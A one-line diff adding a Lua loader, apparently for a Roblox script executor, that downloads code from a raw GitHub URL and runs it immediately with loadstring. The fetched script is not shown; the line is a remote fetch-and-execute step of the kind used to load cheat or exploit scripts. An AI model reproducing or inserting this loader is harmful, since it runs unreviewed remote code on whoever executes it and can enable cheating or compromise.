@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/malfume/Lair/main/(BT)%F0%9F%8D%8A%E2%9B%B5"))()
